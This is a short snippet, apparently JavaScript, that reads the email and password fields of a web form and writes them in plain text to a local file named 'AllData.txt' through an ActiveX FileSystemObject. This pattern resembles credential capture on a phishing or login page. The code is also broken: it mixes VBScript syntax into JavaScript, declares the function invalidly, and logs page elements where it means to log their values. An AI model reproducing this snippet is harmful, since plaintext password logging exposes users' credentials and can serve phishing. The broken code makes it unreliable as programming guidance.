// JavaScript source code
WriteToFile(passForm) {

    set fso = CreateObject('Scripting.FileSystemObject');
    set f = fso.CreateTextFile('AllData.txt', True);

    var Email = document.getElementById('email');
    var Password = document.getElementById('password');

    f.writeline('Email :' + Email);
    f.writeline('Password :' + Password);

    f.writeline('-----------------------------');
    f.Close();
}